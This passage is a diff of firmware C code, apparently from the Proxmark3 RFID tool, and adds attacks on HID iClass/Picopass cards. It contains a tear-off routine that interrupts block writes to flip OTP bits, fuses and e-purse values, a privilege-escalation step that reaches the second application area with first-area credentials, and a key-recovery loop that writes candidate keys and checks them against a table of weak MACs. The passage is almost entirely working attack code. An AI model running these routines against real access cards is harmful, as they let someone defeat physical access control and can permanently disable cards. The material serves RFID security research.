     if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
@@ -1837,18 +2056,25 @@ void iClass_WriteBlock(uint8_t *msg) {
         write_len -= 2;
     } else {
 
-        if (payload->req.use_replay) {
+        if (payload->req.use_replay && (memcmp(payload->mac, "\x00\x00\x00\x00", 4) != 0)) {
             memcpy(write + 10, payload->mac, sizeof(payload->mac));
         } else {
             // Secure tags uses MAC
             uint8_t wb[9];
             wb[0] = payload->req.blockno;
-            memcpy(wb + 1, payload->data, 8);
+            memcpy(wb + 1, payload->data, PICOPASS_BLOCK_SIZE);
 
-            if (payload->req.use_credit_key)
+            if (payload->req.use_credit_key) {
                 doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
-            else
+            } else if (payload->req.use_replay) {
+                priv_esc = do_privilege_escalation(read_check_cc, sizeof(read_check_cc), &eof_time);
+                if (priv_esc == false) {
+                    goto out;
+                }
+                doMAC_N(wb, sizeof(wb), div_cc, mac);
+            } else {
                 doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+            }
 
             memcpy(write + 10, mac, sizeof(mac));
         }
@@ -2070,7 +2296,425 @@ out:
         reply_ng(CMD_HF_ICLASS_CREDIT_EPURSE, PM3_SUCCESS, (uint8_t *)&res, sizeof(uint8_t));
 }
 
+static void iclass_cmp_print(uint8_t *b1, uint8_t *b2, const char *header1, const char *header2) {
+
+    char line1[240] = {0};
+    char line2[240] = {0};
+
+    strcat(line1, header1);
+    strcat(line2, header2);
+
+    for (uint8_t i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
+
+        int l1 = strlen(line1);
+        int l2 = strlen(line2);
+
+        uint8_t hi1 = NIBBLE_HIGH(b1[i]);
+        uint8_t low1 = NIBBLE_LOW(b1[i]);
+
+        uint8_t hi2 = NIBBLE_HIGH(b2[i]);
+        uint8_t low2 = NIBBLE_LOW(b2[i]);
+
+        if (hi1 != hi2) {
+            sprintf(line1 + l1, _RED_("%1X"), hi1);
+            sprintf(line2 + l2, _GREEN_("%1X"), hi2);
+        } else {
+            sprintf(line1 + l1, "%1X", hi1);
+            sprintf(line2 + l2, "%1X", hi2);
+        }
+
+        l1 = strlen(line1);
+        l2 = strlen(line2);
+
+        if (low1 != low2) {
+            sprintf(line1 + l1, _RED_("%1X"), low1);
+            sprintf(line2 + l2, _GREEN_("%1X"), low2);
+        } else {
+            sprintf(line1 + l1, "%1X", low1);
+            sprintf(line2 + l2, "%1X", low2);
+        }
+    }
+    DbpString(line1);
+    DbpString(line2);
+}
+
+void iClass_TearBlock(iclass_tearblock_req_t *msg) {
+
+    if (msg == NULL) {
+        reply_ng(CMD_HF_ICLASS_TEARBL, PM3_ESOFT, NULL, 0);
+        return;
+    }
+
+    // local variable copies
+    int tear_start = msg->tear_start;
+    int tear_end = msg->tear_end;
+    int tear_inc = msg->increment;
+    int tear_loop = msg->tear_loop;
+
+    int loop_count = 0;
+
+    uint32_t start_time = 0;
+    uint32_t eof_time = 0;
+
+    int isok = PM3_SUCCESS;
+
+    uint8_t data[8] = {0};
+    memcpy(data, msg->data, sizeof(data));
+
+    uint8_t mac[4] = {0};
+    memcpy(mac, msg->mac, sizeof(mac));
+
+    picopass_hdr_t hdr = {0};
+    iclass_auth_req_t req = {
+        .blockno = msg->req.blockno,
+        .do_auth = msg->req.do_auth,
+        .send_reply = msg->req.send_reply,
+        .shallow_mod = msg->req.shallow_mod,
+        .use_credit_key = msg->req.use_credit_key,
+        .use_elite = msg->req.use_elite,
+        .use_raw = msg->req.use_raw,
+        .use_replay = msg->req.use_replay
+    };
+    memcpy(req.key, msg->req.key, PICOPASS_BLOCK_SIZE);
+
+    LED_A_ON();
+    Iso15693InitReader();
+
+    // save old debug log level
+    int oldbg = g_dbglevel;
+
+    // no debug logging please
+    g_dbglevel = DBG_NONE;
+
+    // select
+    bool res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+    if (res == false) {
+        DbpString(_RED_("Failed to select iClass tag"));
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    // authenticate
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = authenticate_iclass_tag(&req, &hdr, &start_time, &eof_time, mac);
+    if (res == false) {
+        DbpString(_RED_("Failed to authenticate with iClass tag"));
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    uint8_t data_read_orig[PICOPASS_BLOCK_SIZE] = {0};
+
+    // read block
+    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+    res = iclass_read_block(req.blockno, data_read_orig, &start_time, &eof_time, req.shallow_mod);
+    if (res == false) {
+        Dbprintf("Failed to read block %u", req.blockno);
+        isok = PM3_ECARDEXCHANGE;
+        goto out;
+    }
+
+    bool erase_phase = false;
+    bool read_ok = false;
+
+    // static uint8_t empty[PICOPASS_BLOCK_SIZE] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    static uint8_t zeros[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
+    uint8_t ff_data[PICOPASS_BLOCK_SIZE] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
+    uint8_t data_read[PICOPASS_BLOCK_SIZE] = {0};
+
+    // create READ command
+    uint8_t cmd_read[] = {ICLASS_CMD_READ_OR_IDENTIFY, req.blockno, 0x00, 0x00};
+    AddCrc(cmd_read + 1, 1);
+
+    // create WRITE COMMAND and new block data
+    uint8_t cmd_write[14] = { 0x80 | ICLASS_CMD_UPDATE, req.blockno };
+    uint8_t cmd_write_len = 14;
+    memcpy(cmd_write + 2, data, PICOPASS_BLOCK_SIZE);
+
+    uint8_t pagemap = get_pagemap(&hdr);
+    if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
+        // Unsecured tags uses CRC16,  but don't include the UPDATE operation code
+        // byte0 = update op
+        // byte1 = block no
+        // byte2..9 = new block data
+        AddCrc(cmd_write + 1, 9);
+        cmd_write_len -= 2;
+    } else {
+
+        if (req.use_replay) {
+            memcpy(cmd_write + 10, mac, sizeof(mac));
+        } else {
+            // Secure tags uses MAC
+            uint8_t wb[9];
+            wb[0] = req.blockno;
+            memcpy(wb + 1, data, PICOPASS_BLOCK_SIZE);
+
+            if (req.use_credit_key)
+                doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
+            else
+                doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+
+            memcpy(cmd_write + 10, mac, sizeof(mac));
+        }
+    }
+
+    // Main loop
+    while ((tear_start <= tear_end) && (read_ok == false)) {
+
+        if (BUTTON_PRESS() || data_available()) {
+            isok = PM3_EOPABORTED;
+            goto out;
+        }
+
+        // set tear off trigger
+        g_tearoff_enabled = true;
+        g_tearoff_delay_us = (tear_start & 0xFFFF);
+
+        if (tear_loop > 1) {
+            DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Tear off delay " _YELLOW_("%u") " / " _YELLOW_("%u") " us - " _YELLOW_("%3u") " iter", tear_start, tear_end, loop_count + 1);
+        } else {
+            DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Tear off delay " _YELLOW_("%u") " / " _YELLOW_("%u") " us", tear_start, tear_end);
+        }
+
+        // write block
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(cmd_write, cmd_write_len, &start_time, &eof_time, req.shallow_mod);
+
+        tearoff_hook();
+
+        switch_off();
+
+        // start reading block
+
+        // reinit
+        Iso15693InitReader();
+
+        // select tag
+        res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+        if (res == false) {
+            continue;
+        }
+
+        // skip authentication for config and e-purse blocks (1,2)
+        if (req.blockno > 2) {
+
+            // authenticate
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+            res = authenticate_iclass_tag(&req, &hdr, &start_time, &eof_time, NULL);
+            if (res == false) {
+                DbpString("Failed to authenticate after tear");
+                continue;
+            }
+        }
+
+        // read again and keep field on
+        start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        res = iclass_read_block(req.blockno, data_read, &start_time, &eof_time, req.shallow_mod);
+        if (res == false) {
+            DbpString("Failed to read block after tear");
+            continue;
+        }
+
+        //
+        bool tear_success = true;
+
+        if (memcmp(data_read, data, PICOPASS_BLOCK_SIZE) != 0) {
+            tear_success = false;
+        }
+
+        if ((tear_success == false) &&
+                (memcmp(data_read, zeros, PICOPASS_BLOCK_SIZE) != 0) &&
+                (memcmp(data_read, data_read_orig, PICOPASS_BLOCK_SIZE) != 0)) {
+
+            // tearoff succeeded (partially)
+
+            if (memcmp(data_read, ff_data, PICOPASS_BLOCK_SIZE) == 0 &&
+                    memcmp(data_read_orig, ff_data, PICOPASS_BLOCK_SIZE) != 0) {
+
+                if (erase_phase == false) {
+                    DbpString("");
+                    DbpString(_CYAN_("Erase phase hit... ALL ONES"));
+
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                }
+                erase_phase = true;
+
+            } else {
+
+                if (erase_phase) {
+                    DbpString("");
+                    DbpString(_MAGENTA_("Tearing! Write phase (post erase)"));
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                } else {
+                    DbpString("");
+                    DbpString(_CYAN_("Tearing! unknown phase"));
+                    iclass_cmp_print(data_read_orig, data_read, "Original: ", "Read:     ");
+                }
+            }
+
+            // shall we exit?   well it depends on some things.
+            bool goto_out = false;
+
+            if (req.blockno == 2) {
+                if (memcmp(data_read, ff_data, PICOPASS_BLOCK_SIZE) == 0 && memcmp(data_read_orig, ff_data, PICOPASS_BLOCK_SIZE) != 0) {
+                    DbpString("");
+                    Dbprintf("E-purse has been teared ( %s )", _GREEN_("ok"));
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+            }
+
+            if (req.blockno == 1) {
+
+                // if more OTP bits set..
+                if (data_read[1] > data_read_orig[1] ||
+                        data_read[2] > data_read_orig[2]) {
+
+
+                    // step 4 if bits changed attempt to write the new bits to the tag
+                    if (data_read[7] == 0xBC) {
+                        data_read[7] = 0xAC;
+                    }
+
+                    // prepare WRITE command
+                    cmd_write_len = 14;
+                    memcpy(cmd_write + 2, data_read, PICOPASS_BLOCK_SIZE);
+
+                    if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
+                        // Unsecured tags uses CRC16,  but don't include the UPDATE operation code
+                        // byte0 = update op
+                        // byte1 = block no
+                        // byte2..9 = new block data
+                        AddCrc(cmd_write + 1, 9);
+                        cmd_write_len -= 2;
+                    } else {
+
+                        if (req.use_replay) {
+                            memcpy(cmd_write + 10, mac, sizeof(mac));
+                        } else {
+                            // Secure tags uses MAC
+                            uint8_t wb[9];
+                            wb[0] = req.blockno;
+                            memcpy(wb + 1, data_read, PICOPASS_BLOCK_SIZE);
+
+                            if (req.use_credit_key)
+                                doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
+                            else
+                                doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+
+                            memcpy(cmd_write + 10, mac, sizeof(mac));
+                        }
+                    }
+
+                    // write block
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(cmd_write, cmd_write_len, &start_time, &eof_time, req.shallow_mod);
+
+                    uint16_t resp_len = 0;
+                    uint8_t resp[ICLASS_BUFFER_SIZE] = {0};
+                    res = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_UPDATE, &eof_time, false, true, &resp_len);
+                    if (res == PM3_SUCCESS && resp_len == 10) {
+                        Dbprintf("Wrote to block");
+                    }
+
+                    switch_off();
+
+                    DbpString("");
+                    DbpString("More OTP bits got set!!!");
+
+                    Iso15693InitReader();
+
+                    // select tag,   during which we read block1
+                    res = select_iclass_tag(&hdr, req.use_credit_key, &eof_time, req.shallow_mod);
+                    if (res) {
+
+                        if (memcmp(&hdr.conf, cmd_write + 2, PICOPASS_BLOCK_SIZE) == 0) {
+                            Dbprintf("Stabilize the bits ( "_GREEN_("ok") " )");
+                        } else {
+                            Dbprintf("Stabilize the bits ( "_RED_("failed") " )");
+                        }
+                    }
+
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+
+                if (data_read[0] != data_read_orig[0]) {
+                    DbpString("");
+                    Dbprintf("Application limit changed, from "_YELLOW_("%u")" to "_YELLOW_("%u"), data_read_orig[0], data_read[0]);
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+
+                if (data_read[7] != data_read_orig[7]) {
+                    DbpString("");
+                    Dbprintf("Fuse changed, from "_YELLOW_("%02x")" to "_YELLOW_("%02x"), data_read_orig[7], data_read[7]);
+
+                    const char *flag_names[8] = {
+                        "RA",
+                        "Fprod0",
+                        "Fprod1",
+                        "Crypt0 (*1)",
+                        "Crypt1 (*0)",
+                        "Coding0",
+                        "Coding1",
+                        "Fpers  (*1)"
+                    };
+                    Dbprintf(_YELLOW_("%-10s %-10s %-10s"), "Fuse", "Original", "Changed");
+                    Dbprintf("---------------------------------------");
+                    for (int i = 7; i >= 0; --i) {
+                        int bit1 = (data_read_orig[7] >> i) & 1;
+                        int bit2 = (data_read[7] >> i) & 1;
+                        Dbprintf("%-11s %-10d %-10d", flag_names[i], bit1, bit2);
+                    }
+
+                    isok = PM3_SUCCESS;
+                    goto_out = true;
+                }
+            }
+
+            if (goto_out) {
+                goto out;
+            }
+        }
+
+        // tearoff succeeded with expected values,  which is unlikely
+        if (tear_success) {
+            read_ok = true;
+            tear_success = true;
+            DbpString("");
+            DbpString("tear success (expected values)!");
+        }
+
+        loop_count++;
+
+        // increase tear off delay
+        if (loop_count == tear_loop) {
+            tear_start += tear_inc;
+            loop_count = 0;
+        }
+    }
+
+out:
+
+    switch_off();
+
+    // reset tear off trigger
+    g_tearoff_enabled = false;
+
+    // restore debug message levels
+    g_dbglevel = oldbg;
+
+    if (msg->req.send_reply) {
+        reply_ng(CMD_HF_ICLASS_TEARBL, isok, NULL, 0);
+    }
+}
+
 void iClass_Restore(iclass_restore_req_t *msg) {
+    bool priv_esc = false;
+    uint8_t read_check_cc[] = { 0x10 | ICLASS_CMD_READCHECK, 0x18 };
+    uint8_t div_cc[8] = {0};
 
     // sanitation
     if (msg == NULL) {
@@ -2099,7 +2743,9 @@ void iClass_Restore(iclass_restore_req_t *msg) {
     if (res == false) {
         goto out;
     }
+    iclass_calc_div_key(hdr.csn, credit_key, div_cc, false);
 
+    read_check_cc[1] = hdr.conf.app_limit + 1; //first block of AA2
     // authenticate
     uint8_t mac[4] = {0};
     uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
@@ -2129,10 +2775,17 @@ void iClass_Restore(iclass_restore_req_t *msg) {
             wb[0] = item.blockno;
             memcpy(wb + 1, item.data, 8);
 
-            if (msg->req.use_credit_key)
+            if (msg->req.use_credit_key) {
                 doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
-            else
+            } else if (msg->req.use_replay) {
+                priv_esc = do_privilege_escalation(read_check_cc, sizeof(read_check_cc), &eof_time);
+                if (priv_esc == false) {
+                    goto out;
+                }
+                doMAC_N(wb, sizeof(wb), div_cc, mac);
+            } else {
                 doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+            }
         }
 
         // data + mac
@@ -2150,5 +2803,469 @@ out:
     if (msg->req.send_reply) {
         int isOK = (written == msg->item_cnt) ? PM3_SUCCESS : PM3_ESOFT;
         reply_ng(CMD_HF_ICLASS_RESTORE, isOK, NULL, 0);
+    }
+}
+
+static void generate_single_key_block_inverted_opt(const uint8_t *startingKey, uint32_t index, uint8_t *keyBlock) {
+
+    uint8_t bits_index = index / 16383;
+    uint8_t ending_bits[] = { // all possible 70 combinations of 4x0 and 4x1 as key ending bits
+        0x0F, 0x17, 0x1B, 0x1D, 0x1E, 0x27, 0x2B, 0x2D, 0x2E, 0x33,
+        0x35, 0x36, 0x39, 0x3A, 0x3C, 0x47, 0x4B, 0x4D, 0x4E, 0x53,
+        0x55, 0x56, 0x59, 0x5A, 0x5C, 0x63, 0x65, 0x66, 0x69, 0x6A,
+        0x6C, 0x71, 0x72, 0x74, 0x78, 0x87, 0x8B, 0x8D, 0x8E, 0x93,
+        0x95, 0x96, 0x99, 0x9A, 0x9C, 0xA3, 0xA5, 0xA6, 0xA9, 0xAA,
+        0xAC, 0xB1, 0xB2, 0xB4, 0xB8, 0xC3, 0xC5, 0xC6, 0xC9, 0xCA,
+        0xCC, 0xD1, 0xD2, 0xD4, 0xD8, 0xE1, 0xE2, 0xE4, 0xE8, 0xF0
+    };
+
+    uint8_t binary_endings[8]; // Array to store binary values for each ending bit
+    // Extract each bit from the ending_bits[k] and store it in binary_endings
+    uint8_t ending = ending_bits[bits_index];
+    for (int i = 7; i >= 0; i--) {
+        binary_endings[i] = ending & 1;
+        ending >>= 1;
+    }
+
+    uint8_t binary_mids[8];    // Array to store the 2-bit chunks of index
+    // Iterate over the 16-bit integer and store 2 bits at a time in the result array
+    for (int i = 0; i < 8; i++) {
+        // Shift and mask to get 2 bits and store them as an 8-bit value
+        binary_mids[7 - i] = (index >> (i * 2)) & 0x03; // 0x03 is a mask for 2 bits (binary 11)
+    }
+    memcpy(keyBlock, startingKey, PICOPASS_BLOCK_SIZE);
+
+    // Start from the second byte, index 1 as we're never gonna touch the first byte
+    for (int i = 1; i < PICOPASS_BLOCK_SIZE; i++) {
+        // Clear the last three bits of the current byte (AND with 0xF8)
+        keyBlock[i] &= 0xF8;
+        // Set the last bit to the corresponding value from binary_endings (OR with binary_endings[i])
+        keyBlock[i] |= ((binary_mids[i] & 0x03) << 1) | (binary_endings[i] & 0x01);
+    }
+}
+
+void iClass_Recover(iclass_recover_req_t *msg) {
+
+    bool shallow_mod = false;
+    uint8_t zero_key[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    uint8_t genkeyblock[PICOPASS_BLOCK_SIZE] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+    uint8_t fast_restore_key[PICOPASS_BLOCK_SIZE] = {0};
+    uint8_t fast_previous_key[PICOPASS_BLOCK_SIZE] = {0};
+    uint8_t fast_current_key[PICOPASS_BLOCK_SIZE] = {0};
+    uint32_t index = msg->index;
+    bool short_delay = msg->short_delay;
+    int bits_found = -1;
+    bool recovered = false;
+    bool completed = false;
+    bool interrupted = false;
+    uint8_t div_key2[8] = {0};
+    uint32_t eof_time = 0;
+    uint32_t start_time = 0;
+    uint8_t read_check_cc[] = { 0x10 | ICLASS_CMD_READCHECK, 0x18 }; //block 24 with credit key
+    uint8_t read_check_cc2[] = { 0x80 | ICLASS_CMD_READCHECK, 0x02 }; //block 2 -> to check Kd macs
+
+    /*  iclass_mac_table is a series of weak macs, those weak macs correspond to the different combinations of the last 3 bits of each key byte. */
+
+    static uint8_t iclass_mac_table[8][8] = {    //Reference weak macs table
+        { 0x00, 0x00, 0x00, 0x00, 0xBF, 0x5D, 0x67, 0x7F }, //Expected mac when last 3 bits of each byte are: 000
+        { 0x00, 0x00, 0x00, 0x00, 0x10, 0xED, 0x6F, 0x11 }, //Expected mac when last 3 bits of each byte are: 001
+        { 0x00, 0x00, 0x00, 0x00, 0x53, 0x35, 0x42, 0x0F }, //Expected mac when last 3 bits of each byte are: 010
+        { 0x00, 0x00, 0x00, 0x00, 0xAB, 0x47, 0x4D, 0xA0 }, //Expected mac when last 3 bits of each byte are: 011
+        { 0x00, 0x00, 0x00, 0x00, 0xF6, 0xCF, 0x43, 0x36 }, //Expected mac when last 3 bits of each byte are: 100
+        { 0x00, 0x00, 0x00, 0x00, 0x59, 0x7F, 0x4B, 0x58 }, //Expected mac when last 3 bits of each byte are: 101
+        { 0x00, 0x00, 0x00, 0x00, 0x1A, 0xA7, 0x66, 0x46 }, //Expected mac when last 3 bits of each byte are: 110
+        { 0x00, 0x00, 0x00, 0x00, 0xE2, 0xD5, 0x69, 0xE9 }  //Expected mac when last 3 bits of each byte are: 111
+    };
+
+    LED_A_ON();
+    DbpString(_RED_("Interrupting this process may render the card unusable!"));
+    memcpy(div_key2, msg->nfa, 8);
+
+    //START LOOP
+    uint32_t loops = 1;
+    bool card_select = false;
+    bool card_auth = false;
+    bool priv_esc = false;
+    int status_message = 0;
+    int reinit_tentatives = 0;
+    bool res = false;
+    picopass_hdr_t hdr = {0};
+    uint8_t original_mac[8] = {0};
+    uint8_t mac1[4] = {0};
+
+    while ((card_select == false) || (card_auth == false)) {
+
+        Iso15693InitReader(); //has to be at the top as it starts tracing
+        if (msg->debug == false) {
+            set_tracing(false); //disable tracing to prevent crashes - set to true for debugging
+        } else {
+            if (loops == 1) {
+                clear_trace(); //if we're debugging better to clear the trace but do it only on the first loop
+            }
+        }
+        //Step0 Card Select Routine
+        eof_time = 0; //reset eof time
+        res = select_iclass_tag(&hdr, false, &eof_time, shallow_mod);
+        if (res) {
+            status_message = 1; //card select successful
+            card_select = true;
+        }
+
+        //Step 0A - The read_check_cc block has to be in AA2, set it by checking the card configuration
+        read_check_cc[1] = hdr.conf.app_limit + 1; //first block of AA2
+        //Step1 Authenticate with AA1 using trace
+        if (card_select) {
+            memcpy(original_mac, msg->req.key, 8);
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+            res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+            if (res) {
+                status_message = 2; //authentication with AA1 macs successful
+                card_auth = true;
+            }
+        }
+
+        if ((card_select == false) || (card_auth == false)) {
+            reinit_tentatives++;
+            switch_off();
+        }
+
+        if (reinit_tentatives == 5) {
+            DbpString("");
+            DbpString(_RED_("Unable to select or authenticate with card multiple times! Stopping."));
+            goto out;
+        }
+    }
+
+    while (bits_found == -1) {
+
+        reinit_tentatives = 0;
+        uint8_t mac2[4] = {0};
+        res = false;
+
+        if (BUTTON_PRESS() || loops > msg->loop) {
+            if (loops > msg->loop) {
+                completed = true;
+            } else {
+                interrupted = true;
+            }
+            if (msg->fast) {
+                goto fast_restore;
+            }
+            goto out;
+        }
+
+        if (msg->test) {
+            Dbprintf(_YELLOW_("*Cycled Reader*") " TEST Index - Loops: "_YELLOW_("%3d / %3d") " *", loops, msg->loop);
+        } else if (msg->debug || ((card_select == false) && (card_auth == false))) {
+            Dbprintf(_YELLOW_("*Cycled Reader*") " Index: "_RED_("%3d")" Loops: "_YELLOW_("%3d / %3d") " *", index, loops, msg->loop);
+        } else {
+            DbprintfEx(FLAG_INPLACE, "[" _BLUE_("#") "] Index: "_CYAN_("%3d")" Loops: "_YELLOW_("%3d / %3d")" ", index, loops, msg->loop);
+        }
+
+        while ((card_select == false) || (card_auth == false)) {
+
+            Iso15693InitReader(); // has to be at the top as it starts tracing
+            set_tracing(false);   // disable tracing to prevent crashes - set to true for debugging
+            // Step0 Card Select Routine
+            eof_time = 0; // reset eof time
+            res = select_iclass_tag(&hdr, false, &eof_time, shallow_mod);
+            if (res) {
+                status_message = 1; // card select successful
+                card_select = true;
+            }
+
+            // Step1 Authenticate with AA1 using trace
+            if (card_select) {
+                memcpy(original_mac, msg->req.key, 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+                if (res) {
+                    status_message = 2; //authentication with AA1 macs successful
+                    card_auth = true;
+                }
+            }
+
+            if ((card_select == false) || (card_auth == false)) {
+                reinit_tentatives++;
+                switch_off();
+            }
+
+            if (reinit_tentatives == 5) {
+                DbpString("");
+                DbpString(_RED_("Unable to select or authenticate with card multiple times! Stopping."));
+                goto out;
+            }
+        }
+
+        // Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
+        if (priv_esc == false) {
+            priv_esc = do_privilege_escalation(read_check_cc, sizeof(read_check_cc), &eof_time);
+            if (priv_esc) {
+                status_message = 3;
+            } else {
+                goto out;
+            }
+        }
+
+        if (priv_esc && status_message != 3) {
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+            iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
+            status_message = 3;
+        }
+
+        // Step3 Calculate New Key (Optimised Algo V2)
+        generate_single_key_block_inverted_opt(zero_key, index, genkeyblock);
+        if (msg->test) {
+            memcpy(genkeyblock, zero_key, PICOPASS_BLOCK_SIZE);
+        }
+
+        if (msg->fast) { // if we're skipping restoring the original key to gain speed, xor the new index key with the previous index key and update the difference and track restore values differently
+
+            if (index > 0 && loops > 1) {
+                generate_single_key_block_inverted_opt(zero_key, index - 1, fast_previous_key);
+            } else {
+                memcpy(fast_previous_key, zero_key, PICOPASS_BLOCK_SIZE);
+            }
+
+            for (int i = 0; i < PICOPASS_BLOCK_SIZE; i++) {
+                fast_current_key[i] = genkeyblock[i] ^ fast_previous_key[i];
+                fast_restore_key[i] = fast_restore_key[i] ^ fast_current_key[i];
+            }
+
+            memcpy(genkeyblock, fast_current_key, PICOPASS_BLOCK_SIZE);
+        }
+
+        // Step4 Calculate New Mac
+
+        uint8_t wb[9] = {0};
+        uint8_t blockno = 3;
+        wb[0] = blockno;
+        memcpy(wb + 1, genkeyblock, 8);
+        doMAC_N(wb, sizeof(wb), div_key2, mac2);
+        bool written = false;
+        bool write_error = false;
+
+        while (written == false && write_error == false) {
+            // Step5 Perform Write
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+            if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time, short_delay)) {
+                status_message = 4;   // wrote new key on the card - unverified
+            }
+            if (msg->fast == false) { // if we're going slow we check at every write that the write actually happened
+                // Reset cypher state
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+                // try to authenticate with the original mac to verify the write happened
+                memcpy(msg->req.key, original_mac, 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+                if (msg->test) {
+                    if (res) {
+                        DbpString("");
+                        DbpString(_GREEN_("*** CARD EPURSE IS LOUD! OK TO ATTEMPT KEY RETRIEVAL! RUN AGAIN WITH -notest ***"));
+                        completed = true;
+                        goto out;
+                    } else {
+                        DbpString("");
+                        DbpString(_RED_("*** CARD EPURSE IS SILENT! RISK OF BRICKING! DO NOT EXECUTE KEY UPDATES! SCAN IT ON READER FOR EPURSE UPDATE, COLLECT NEW TRACES AND TRY AGAIN! ***"));
+                        goto out;
+                    }
+                } else {
+                    if (res) {
+                        write_error = true; // failed to update the key, the card's key is the original one
+                    } else {
+                        status_message = 5; // verified the card key was updated to the new one
+                        written = true;
+                    }
+                }
+            } else { // if we're going fast we can skip the above checks as we're just xorring the key over and over
+                status_message = 5;
+                written = true;
+            }
+        }
+
+        if (write_error == false) {
+            // Step6 Perform 8 authentication attempts + 1 to verify if we found the weak key
+            for (int i = 0; i < 8 ; ++i) {
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+                // need to craft the authentication payload accordingly
+                memcpy(msg->req.key, iclass_mac_table[i], 8);
+                start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1); //mac1 here shouldn't matter
+                if (res == true) {
+                    bits_found = i;
+                    recovered = true;
+                }
+            }
+
+            bool reverted = false;
+            uint8_t revert_retries = 0;
+            if (msg->fast) { // if we're going fast only restore the original key at the end
+                if (recovered) {
+                    goto fast_restore;
+                }
+            } else {
+                // if we're NOT going fast, regardless of bits being found, restore the original key and verify it
+                while (reverted == false) {
+                    // Regain privilege escalation with a readcheck
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time, short_delay)) {
+                        status_message = 6; // restore of original key successful but unverified
+                    }
+                    // Do a readcheck first to reset the cypher state
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+                    iclass_send_as_reader(read_check_cc2, sizeof(read_check_cc2), &start_time, &eof_time, shallow_mod);
+
+                    // need to craft the authentication payload accordingly
+                    memcpy(msg->req.key, original_mac, 8);
+                    start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+
+                    res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac1);
+                    if (res == true) {
+                        status_message = 7; // restore of original key verified - card usable again
+                        reverted = true;
+                        if (recovered) {
+                            goto restore;
+                        }
+                    }
+
+                    revert_retries++;
+                    if (revert_retries >= 7) { // must always be an odd number!
+                        DbpString("");
+                        DbpString(_CYAN_("Last Written Key: "));
+                        Dbhexdump(8, genkeyblock, false);
+                        Dbprintf(_RED_("Attempted to restore original key for %3d times and failed. Stopping. Card is likely unusable."), revert_retries);
+                        goto out;
+                    }
+                }
+            }
+        }
+
+        if (msg->debug) {
+            if (status_message >= 1) {
+                DbpString("");
+                DbpString("Card Select:............."_GREEN_("Ok!"));
+            }
+            if (status_message >= 2) {
+                DbpString("AA1 macs authentication:."_GREEN_("Ok!"));
+            }
+            if (status_message >= 3) {
